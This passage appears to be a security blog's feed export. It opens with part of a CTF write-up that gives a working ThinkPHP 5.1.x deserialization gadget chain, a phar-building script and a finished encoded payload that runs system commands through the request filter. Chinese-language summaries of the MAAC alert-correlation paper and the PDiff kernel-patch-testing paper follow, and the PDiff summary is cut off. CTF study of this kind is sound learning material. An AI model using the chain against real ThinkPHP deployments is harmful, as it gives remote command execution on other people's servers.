class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;ethan&quot;</span>=&gt;[<span class="string">&quot;dir&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;ethan&quot;</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•è¯·æ±‚ç±»å‹ä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// è¡¨å•pjaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// å…¼å®¹PATH_INFOè·å–</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// åŸŸåæ ¹ï¼Œå¦‚thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPSä»£ç†æ ‡è¯†</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IPä»£ç†è·å–æ ‡è¯†</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URLä¼ªé™æ€åç¼€</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="variable">$win</span> = <span class="keyword">new</span> Windows();</span><br><span class="line"><span class="comment">//echo base64_encode(serialize(new Windows()));</span></span><br><span class="line"><span class="comment">//id=whoami</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phar.phar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;tp5137.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="variable">$win</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸¤æ¬¡urlencodeæ˜¯base64ä¸­+å’Œ=çš„å…³ç³»ï¼Œç”±äºä»£ç é‡Œæœ‰parse_strå’Œextractï¼Œè¿™æ ·æ‰èƒ½æ­£å¸¸èµ‹å€¼</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(urlencode(file_get_contents(<span class="string">&quot;phar.phar&quot;</span>)));</span><br></pre></td></tr></table></figure><p>paylod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s=index/index/hello&amp;id=cat%20/y0u_f0und_It</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">world=hello=PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQrBAQAAAQAAABEAAAABAAAAAACLAQAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAqsahYQQAAAAMfn%252FYpAEAAAAAAAB0ZXN0tBgBQ8v5C13sBL%252Fyl3ck2XQg5WACAAAAR0JNQg%253D%253D%26a=phar://hello.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - MAAC: Novel Alert Correlation Method To Detect Multi-step Attack</title>
      <link href="/2021/11/03/MAAC%20-%20Novel%20Alert%20Correlation%20Method%20To%20Detect%20Multi-step%20Attack/"/>
      <url>/2021/11/03/MAAC%20-%20Novel%20Alert%20Correlation%20Method%20To%20Detect%20Multi-step%20Attack/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šX Wang, L Yu, H He, X Gong</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šMAAC: Novel Alert Correlation Method To Detect Multi-step Attack</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://arxiv.org/pdf/2011.07793.pdf">https://arxiv.org/pdf/2011.07793.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šTrustCom 2021</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>é¦–å…ˆéœ€è¦äº†è§£çš„æ˜¯ï¼Œéšç€æ”»å‡»æ‰‹æ®µåŠæ”»å‡»æœºåˆ¶çš„æ”¹è¿›ï¼Œç°åœ¨çš„æ”»å‡»è€…å¾€å¾€ä¼šè€ƒè™‘åˆ©ç”¨åˆ†å¸ƒå¼æ”»å‡»çš„æ–¹å¼æ¥è¿›æ”»ã€‚æœ€ä¸ºç›´è§‚çš„ä¾¿æ˜¯é«˜çº§ç½‘ç»œæ”»å‡»ä¼šåŒ…å«å¤šä¸ªæ”»å‡»é˜¶æ®µæ¥å®ç°æœ€ç»ˆç›®æ ‡ã€‚è€Œä¼ ç»Ÿçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œä¾‹å¦‚IDSã€é˜²ç«å¢™ç­‰ç­‰ç”¨äºç›‘è§†ç½‘ç»œæƒ…å†µçš„å·¥å…·ä¼šåœ¨è¢«æ”»å‡»æœŸé—´äº§ç”Ÿå¤§é‡å‘Šè­¦ã€‚è™½ç„¶è¿™äº›å‘Šè­¦ä¸­åŒ…å«äº†å…³è”æ”»å‡»è€…çš„æ”»å‡»çº¿ç´¢ï¼Œä½†å¤§éƒ¨åˆ†çš„å‘Šè­¦æ˜¯ä¸æ”»å‡»æ— å…³çš„è¯¯æŠ¥ã€‚å¯¹äºç½‘ç»œç®¡ç†äººå‘˜æ¥è¯´ï¼Œæ‰‹åŠ¨åœ¨å¤§é‡å¼‚æ„çš„å‘Šè­¦ä¸­æ’æŸ¥æ¢³ç†å‡ºæ”»å‡»è€…çš„æ”»å‡»é˜¶æ®µå’Œè·¯çº¿çŠ¹å¦‚å¤§æµ·æé’ˆã€‚</p><p>ä½œè€…æå‡ºå¹¶å®ç°äº†MAACï¼Œä¸€ä¸ªå¤šé˜¶æ®µæ”»å‡»å‘Šè­¦å…³è”åˆ†æç³»ç»Ÿï¼Œå®ƒèƒ½å¤Ÿæœ‰æ•ˆåœ°å‡å°‘é‡å¤çš„å‘Šè­¦ï¼Œå¹¶æ ¹æ®å‘Šè­¦çš„è¯­ä¹‰å’Œæ”»å‡»é˜¶æ®µæ¥ç»„åˆç”Ÿæˆå¯ç–‘çš„å¤šé˜¶æ®µæ”»å‡»è·¯å¾„ã€‚æœ¬æ–‡ä¸»è¦è§£å†³äº†ä¸€ä¸ªé—®é¢˜ï¼Œå³å¦‚ä½•äº†è§£å‘Šè­¦çš„è¯­ä¹‰ï¼Œå¹¶é€šè¿‡è¯­ä¹‰è¿›è¡Œèšåˆå’Œå…³è”ï¼Œæœ€ç»ˆå¾—åˆ°å¯ç–‘ä¸»æœºå’Œæ”»å‡»è·¯å¾„çš„é¡ºåºã€‚è¿™ä¸ªé—®é¢˜ä¸»è¦æœ‰ä¸‰ä¸ªæ–¹é¢ï¼š</p><ol><li>å‘Šè­¦è¯­ä¹‰ï¼šå®ç°çš„ç®—æ³•åº”è¯¥èƒ½å¤Ÿç†è§£å‘Šè­¦çš„å«ä¹‰ï¼Œå¹¶é€šè¿‡å‘Šè­¦è¯­ä¹‰åˆ†æè·å¾—æ”»å‡»æ‰€å±é˜¶æ®µ</li><li>æ”»å‡»å…³è”æ€§ï¼šè¿™éƒ¨åˆ†çš„æŒ‘æˆ˜åœ¨äºé€šè¿‡é€»è¾‘è¯­ä¹‰è‡ªåŠ¨å…³è”å‘Šè­¦ï¼Œè€Œéæ˜¯é€šè¿‡ç‰¹å¾æˆ–è€…æ‰‹åŠ¨å…³è”</li><li>æ”»å‡»è·¯å¾„å‘ç°ï¼šä½œè€…çš„ç›®æ ‡æ˜¯å»ºç«‹ä¸€ä¸ªæ”»å‡»å‘Šè­¦å›¾å¹¶æä¾›å¯èƒ½å­˜åœ¨çš„æ”»å‡»è·¯å¾„ï¼ŒåŒæ—¶å¯¹ç–‘ä¼¼æ²¦é™·çš„ä¸»æœºè¿›è¡Œæ’åº</li></ol><h2 id="0x02-Method"><a href="#0x02-Method" class="headerlink" title="0x02 Method"></a>0x02 Method</h2><p>ä½œè€…æ„å»ºäº†ä¸€ä¸ªå¨èƒæ¨¡å‹ç”¨äºç ”ç©¶ï¼Œå¦‚ä¸‹å›¾<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/3bd36641-0adb-486f-a58c-263e1041504e.png"><br>æ”»å‡»è€…é¦–å…ˆå°è¯•æ”»å‡»åŠå…¬ç½‘ä¸­çš„ä¸¤å°ä¸»æœºï¼Œé€šè¿‡é’“é±¼é‚®ä»¶çš„æ–¹å¼æˆ–å…¶ä»–æ–¹æ³•ï¼Œå¦‚CVE-2017011882ï¼Œä½†ä»…æˆåŠŸä¸€å°ã€‚éšåï¼Œæ”»å‡»è€…åœ¨è¿™å°ç”µè„‘ä¸Šå®‰è£…åé—¨ï¼Œå¹¶å¼€å§‹å°è¯•æ¨ªå‘ç§»åŠ¨ï¼Œå…¶é€šè¿‡è¿™å°å—æ§ä¸»æœºè¿›è¡Œå†…ç½‘æ‰«æï¼Œå°è¯•åˆ©ç”¨MS17-010ç­‰æ¼æ´ç›´æ¥æ§åˆ¶å†…ç½‘å…¶ä»–ä¸»æœºï¼Œè¿™æ—¶åˆä»…æœ‰ä¸€å°æˆåŠŸï¼Œè¿™å°ä¸»æœºä¸æ ¸å¿ƒæœåŠ¡å™¨ç›¸è¿ï¼Œæ”»å‡»è€…ä¾¿èƒ½å¤Ÿä»æ ¸å¿ƒæœåŠ¡ä¸­è·å–æ•æ„Ÿä¿¡æ¯ã€‚</p><p>åœ¨æ•´ä¸ªå…¥ä¾µè¿‡ç¨‹ä¸­ï¼Œè¾¹ç•Œå’Œå†…éƒ¨ç½‘ç»œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿä¼šåˆ†åˆ«äº§ç”Ÿå¤§é‡çš„å‘Šè­¦ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰å¤§é‡ç”±ä¸»æœºç«¯å®‰è£…çš„å®‰å…¨è½¯ä»¶äº§ç”Ÿçš„å…³äºæ¶æ„æ–‡ä»¶å’Œåé—¨çš„å‘Šè­¦ã€‚è¿™äº›å‘Šè­¦æ˜¯æ··ä¹±ï¼Œä¸”å¤§é‡é‡å¤çš„ã€‚ä¸è®ºæ˜¯å‘Šè­¦çš„åˆ†æ•£æ€§è¿˜æ˜¯é‡å¤æ€§éƒ½ä¸¥é‡é˜»ç¢äº†ç½‘ç»œç®¡ç†äººå‘˜çš„æ’æŸ¥ï¼Œå¢åŠ äº†æ”»å‡»æ£€æµ‹çš„éš¾åº¦ï¼Œæ‰€ä»¥ä½œè€…èšç„¦äºå¦‚ä½•å¤„ç†å‘Šè­¦è€Œä¸æ˜¯å¦‚ä½•ç”Ÿæˆå‘Šè­¦ã€‚ä»¥ä¸‹æ˜¯MAACçš„æ¶æ„ï¼Œæ€»ç»“èµ·æ¥ä¸»è¦æ˜¯äº”éƒ¨åˆ†ï¼š</p><ol><li>å‘Šè­¦è§£æï¼šè§„èŒƒåŒ–ä¸åŒå®‰å…¨è®¾å¤‡å’Œè½¯ä»¶ç”Ÿæˆçš„å‘Šè­¦ï¼Œè§£ææˆæ ‡å‡†åŒ–å‘Šè­¦</li><li>å‘Šè­¦ä¿¡æ¯å‘é‡åŒ–ï¼šä¸»è¦æ˜¯ä¸ºäº†å°½å¯èƒ½å‡å°‘é‡å¤çš„å‘Šè­¦çš„æ•°é‡ï¼Œå»æ‰æ— æ„ä¹‰çš„å¹²æ‰°é¡¹</li><li>å‘Šè­¦å…³è”åˆ†æï¼šåœ¨ç²¾ç®€äº†ç•™å­˜äº†æœ‰æ•ˆå‘Šè­¦ä¹‹åï¼ŒMAACå°†å‘Šè­¦å…³è”èµ·æ¥ç”Ÿæˆå‘Šè­¦å›¾ï¼ŒåŒ…æ‹¬åŒä¸€ä¸»æœºä¸Šçš„å‘Šè­¦å…³è”å’Œä¸åŒä¸»æœºä¹‹é—´å‘Šè­¦çš„å…³è”</li><li>å›¾éå†ï¼šåœ¨ç”Ÿæˆå‘Šè­¦å›¾ä¹‹åï¼ŒMAACä¼šéå†è¯¥å›¾æŸ¥æ‰¾å…·æœ‰ä¸‰ä¸ªåŠä»¥ä¸Šçš„æ‰€æœ‰è·¯å¾„</li><li>æ”»å‡»è·¯å¾„æ’åï¼šä½œè€…æå‡ºäº†ç”¨äºè®¡ç®—è·¯å¾„æ¦‚ç‡çš„æ–¹ç¨‹ï¼Œä»¥è·å¾—æœ€å¯èƒ½çš„æ”»å‡»è·¯å¾„</li></ol><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/ad2cab44-59b5-43de-9f16-adacc4e13fcd.png"></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>åœ¨æœ¬æ–‡ä¸­ï¼Œä½œè€…æå‡ºå¹¶å®ç°äº†MAACï¼Œè¿™æ˜¯ä¸€ç§åŸºäºè¯­ä¹‰åˆ†æçš„å‘Šè­¦ç¼©å‡å’Œå‘Šè­¦å…³è”æŠ€æœ¯ï¼Œä»¥è§£å†³ç½‘ç»œä¸­å®‰å…¨è®¾å¤‡å‘Šè­¦æ•°é‡çˆ†ç‚¸å¯¼è‡´ç½‘ç»œç®¡ç†äººå‘˜æ— æ³•åŠæ—¶æœ‰æ•ˆåœ°æ’é™¤æ”»å‡»è€…å¨èƒçš„æƒ…å†µã€‚åŒæ—¶ï¼ŒMAACèƒ½å¤Ÿç»™å‡ºå¯èƒ½çš„æ”»å‡»è·¯å¾„åŠå…¶å¯ç–‘ç¨‹åº¦ï¼Œè¿›ä¸€æ­¥ååŠ©æ”»å‡»æ£€æµ‹ï¼Œå®ƒå¹¶ä¸éœ€è¦å…ˆéªŒçŸ¥è¯†ï¼Œå®Œå…¨ç”±å‘Šè­¦ä¹‹é—´çš„å…³è”ç”Ÿæˆã€‚</p><p>è¯»è€…åœ¨è¯»å®Œè¿™ç¯‡æ–‡ç« åä¸»è¦æœ‰ä¸¤ä¸ªç–‘é—®ï¼šä¸€æ˜¯æ•°æ®é›†çš„é—®é¢˜ï¼Œä½œè€…åœ¨Real-World Evaluationéƒ¨åˆ†ä¸­æè¿°äº†å…¶ç”¨äºè¯„ä¼°çš„æ•°æ®é›†ï¼Œä½†è¿™å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œè¿™äº›æ•°æ®é›†åæ—§äº†ï¼Œè¿‘å‡ å¹´å®‰å…¨è®¾å¤‡çš„è¿­ä»£ç›¸è¾ƒäº10å¹´åˆå¯è°“æ˜¯æ—¥æ–°æœˆå¼‚ï¼Œç°æœ‰çš„å®‰å…¨è®¾å¤‡çš„å‘Šè­¦ç›¸è¾ƒäºä½œè€…ä½¿ç”¨çš„æ•°æ®é›†ä¸­çš„æœ‰æ•ˆæ€§åº”è¯¥ä¼šé«˜å¾ˆå¤šï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹MAACçš„å…³è”åˆ†æä¼šä¸ä¼šæ›´åŠ ç²¾å‡†ä¸€äº›å‘¢ï¼ŸäºŒæ˜¯è·¯å¾„å‘ç°é—®é¢˜ï¼Œä»…ä»…åªæ˜¯æ‰¾ä¸‰ä¸ªèŠ‚ç‚¹åŠä»¥ä¸Šçš„è·¯å¾„æ˜¯å¦‚ä½•ç¡®å®šçš„å‘¢ï¼ŒçŸ­è·¯å¾„ï¼Œå³ä¸€ä¸¤æ­¥çš„æ”»å‡»è·¯å¾„ä¸ºä½•ä¸è€ƒè™‘å‘¢ï¼Ÿä¹Ÿè®¸æ”»å‡»è€…ç›´æ¥ä¸€å°é‚®ä»¶é‚®åˆ°ç½‘ç»œç®¡ç†å‘˜é‚£é‡Œï¼Œæ°å¥½ç½‘ç»œç®¡ç†å‘˜åˆåœ¨åŸŸæ§å‘¢ï¼Ÿä¸è¿‡æ€»çš„æ¥è¯´ï¼Œè¿™ç¯‡æ–‡ç« ç«™åœ¨ä¸€ä¸ªæ–°çš„è§’åº¦å¯¹å†…ç½‘æ”»å‡»ï¼Œå°¤å…¶æ˜¯è¿™ç§å¤šé˜¶æ®µçš„æ”»å‡»æ£€æµ‹æå‡ºäº†ä¸€ä¸ªç‰¹åˆ«å¥½çš„æ£€æµ‹æ€è·¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustCom&#39;21 </tag>
            
            <tag> Attack Detection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - PDiff: Semantic-based Patch Presence Testing for Downstream Kernels</title>
      <link href="/2021/10/27/PDiff%20-%20Semantic-based%20Patch%20Presence%20Testing%20for%20Downstream%20Kernels/"/>
      <url>/2021/10/27/PDiff%20-%20Semantic-based%20Patch%20Presence%20Testing%20for%20Downstream%20Kernels/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šZ Jiang, Y Zhang, J Xu, Q Wen, Z Wang</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šPDiff: Semantic-based Patch Presence Testing for Downstream Kernels</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://secsys.fudan.edu.cn/_upload/article/files/69/06/2b05ab0d4f8bba54fd410b031ae8/7024cbe1-82e7-4308-876a-4c8973eb809a.pdf">https://secsys.fudan.edu.cn/_upload/article/files/69/06/2b05ab0d4f8bba54fd410b031ae8/7024cbe1-82e7-4308-876a-4c8973eb809a.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šCCS 2020</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>é¦–å…ˆéœ€è¦äº†è§£çš„èƒŒæ™¯æ˜¯ï¼Œå¼€æºå†…æ ¸é€šå¸¸ä¼šè¢«ä¸€äº›ä¸‹æ¸¸å‚å•†åº”ç”¨åœ¨æ•°åäº¿çš„è®¾å¤‡ä¸Šï¼Œä½†è¿™äº›ä¸‹æ¸¸å‚å•†ç»å¸¸é—æ¼æˆ–æ¨è¿Ÿå…¶ä¸»æµç‰ˆæœ¬ä¸­çš„è¡¥ä¸å‘å¸ƒï¼Œæ›´ç³Ÿç³•çš„æ˜¯æœ‰äº›å‚å•†ç”šè‡³ä¸å…¬å¼€è¡¥ä¸çš„å‘å¸ƒè¿›å±•ï¼Œè¿™å°±å¯¼è‡´äº†å…¶è®¾å¤‡çš„å®‰å…¨æ€§ä¸èƒ½å¤Ÿå¾—åˆ°åŠæ—¶çš„ä¿éšœï¼Œå±å®³å…¶ç”¨æˆ·çš„å®‰å…¨ã€‚æ‰€ä»¥å¯¹äºé‚£äº›å¸¸å¸¸å—åˆ°å®‰å…¨å¨èƒçš„ç¾¤ä½“æ¥è¯´ï¼Œæ‰“è¡¥ä¸çš„æƒ…å†µè‡³å…³é‡è¦ï¼Œè¿™å°±è¦æ±‚æˆ‘ä»¬å¯¹ä¸‹æ¸¸å‚å•†æ‰€å‘å¸ƒçš„è®¾å¤‡çš„å†…æ ¸ä¸­è¡¥ä¸çš„å­˜åœ¨æ€§è¿›è¡Œæµ‹è¯•ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/50cb4bec-f9e3-468f-a019-4edda4aafc9e.png"></p><p>ç°æœ‰çš„æ£€æµ‹æ–¹å¼ä¸»è¦æ˜¯é€šè¿‡ä»£ç ç­¾ååŒ¹é…æ¥åˆ¤æ–­ç›®æ ‡å†…æ ¸ä¸­æ˜¯å¦æœ‰è¡¥ä¸ï¼Œä½†è¿™å¯¹äºå®é™…æƒ…å†µæ¥è¯´æ˜¯è¿œè¿œä¸è¶³çš„ã€‚è¿™ä¸»è¦æ˜¯å› ä¸ºä¸‹æ¸¸å‚å•†é€šå¸¸æ˜¯å®¢åˆ¶åŒ–çš„ä»£ç é£æ ¼ï¼Œè¿™é€šå¸¸ä¼šæ”¹å˜ä¸»æµç‰ˆæœ¬çš„è¡¥ä¸ä»£ç ä»¥é€‚é…å…¶è‡ªèº«çš„ä»£ç æƒ…å†µï¼Œä½¿å¾—æ ¡éªŒå¤±è´¥ã€‚ä½œè€…æå‡ºäº†PDiffï¼Œé¦–å…ˆç”Ÿæˆä¸ç›®æ ‡è¡¥ä¸ç›¸å…³çš„è¯­ä¹‰æ‘˜è¦ï¼Œç„¶ååŸºäºè¿™ä¸ªè¯­ä¹‰æ‘˜è¦ï¼ŒPDiffä¼šå°†ç›®æ ‡å†…æ ¸ä¸é‡‡ç”¨è¡¥ä¸å‰åçš„ä¸»æµç‰ˆæœ¬è¿›è¡Œæ¯”è¾ƒï¼ˆé€‰æ‹©æ›´æ¥è¿‘çš„å‚è€ƒç‰ˆæœ¬æ¥ç¡®å®šè¡¥ä¸çš„çŠ¶æ€ï¼‰ã€‚</p><p>è€Œè¡¥ä¸å­˜åœ¨æ€§æµ‹è¯•çš„ä¸»è¦æŒ‘æˆ˜æ¥è‡ªäºä¸»æµç‰ˆæœ¬å’Œä¸‹æ¸¸å†…æ ¸ä¹‹é—´çš„ä»£ç å±‚å·®å¼‚ï¼Œè¯¦ç»†æ¥è¯´ï¼š</p><ul><li>ç¬¬ä¸‰æ–¹ä»£ç å®šåˆ¶ï¼šå¼€æºå†…æ 